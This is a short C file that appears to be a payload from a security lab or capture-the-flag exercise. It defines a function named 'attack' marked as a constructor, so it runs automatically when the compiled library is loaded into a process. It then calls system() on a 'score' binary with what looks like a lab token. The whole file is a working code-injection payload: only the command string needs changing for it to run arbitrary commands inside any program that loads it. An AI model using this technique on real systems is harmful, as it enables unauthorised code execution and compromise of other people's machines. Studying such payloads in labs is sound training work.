#include<stdio.h>
#include<stdlib.h>

static void attack() __attribute__((constructor));

void attack() {
        system("/usr/local/bin/score fd0b0dad-bc52-47b1-a29c-7f1b2d92ddb8");
}
